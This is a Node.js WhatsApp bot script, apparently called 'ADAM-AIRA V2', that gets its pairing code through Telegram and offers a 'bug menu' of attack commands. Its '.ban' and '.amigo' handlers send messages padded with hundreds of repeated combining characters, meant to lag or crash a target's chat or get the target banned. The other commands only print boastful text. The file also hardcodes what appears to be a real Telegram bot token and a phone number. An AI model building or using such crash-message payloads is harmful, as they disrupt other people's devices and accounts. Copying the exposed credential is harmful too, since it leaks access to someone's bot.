const { default: makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require("@whiskeysockets/baileys");
const pino = require("pino");
const TelegramBot = require('node-telegram-bot-api');

// --- ⚙️ CONFIGURATION ---
const TG_TOKEN = '8189699127:AAHVUDw1eV9a1UZ5oGiBJ9DaD9eA6ReZ_GY';
const MY_NUMBER = '918921584368'; // Ninte number with 91
const MY_TG_ID = '7445393741'; // Ninte Telegram Chat ID (Example ID)

const tgBot = new TelegramBot(TG_TOKEN, { polling: true });

async function startAira() {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        auth: state,
        version,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        browser: ["AIRA-V2", "Chrome", "20.0.04"]
    });

    // --- 🔑 TG PAIRING LOGIC ---
    if (!sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                let code = await sock.requestPairingCode(MY_NUMBER);
                const pairMsg = `🚀 *ADAM-AIRA V2 CONNECTED*\n\nYour Pairing Code: \`${code}\` \n\nWhatsApp Link Device-il ee code enter cheyyu muthe!`;
                tgBot.sendMessage(MY_TG_ID, pairMsg, { parse_mode: 'Markdown' });
                console.log("Pairing code sent to Telegram!");
            } catch (e) { console.log("Pairing Error:", e); }
        }, 5000);
    }

    sock.ev.on("creds.update", saveCreds);

    // --- 🛠️ COMMANDS (ONLY FOR YOU) ---
    sock.ev.on("messages.upsert", async ({ messages }) => {
        const msg = messages[0];
        if (!msg.message || !msg.key.fromMe) return; // Ninte device-il ninnum mathrame work aaku

        const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
        const from = msg.key.remoteJid;
        const cmd = text.toLowerCase();

        // 📜 MENU
        if (cmd === ".menu") {
            const menu = `*--- ADAM-AIRA V2 BUG MENU ---*\n\n` +
                         `👾 *.amigo* - [Lagg Bug]\n` +
                         `🌪️ *.aira* - [System Overload]\n` +
                         `⏳ *.delay* - [Response Delay]\n` +
                         `🚫 *.ban* - [WhatsApp Ban Trigger]\n\n` +
                         `*Status:* Live & Dark ⚡`;
            await sock.sendMessage(from, { text: menu });
        }

        // 💀 BUG LOGIC
        if (cmd === ".ban") {
            const banBug = "❗" + "ॣ".repeat(1000) + "🚫";
            await sock.sendMessage(from, { text: `*BAN BUG INITIATED...* 😈\n${banBug}` });
        }
        if (cmd === ".amigo") {
            const amigo = "👾" + "҉".repeat(500) + "👾";
            await sock.sendMessage(from, { text: `*AMIGO LAGG SENT:* \n${amigo}` });
        }
        if (cmd === ".aira") {
            await sock.sendMessage(from, { text: "🌪️ *AIRA SYSTEM CRASHING TARGET...*" });
        }
        if (cmd === ".delay") {
            await sock.sendMessage(from, { text: "⏳ *DELAY BUG ACTIVATED. LOADING...*" });
        }
    });

    sock.ev.on("connection.update", (u) => { if (u.connection === "open") console.log("AIRA IS LIVE! 🦾"); });
}

startAira();
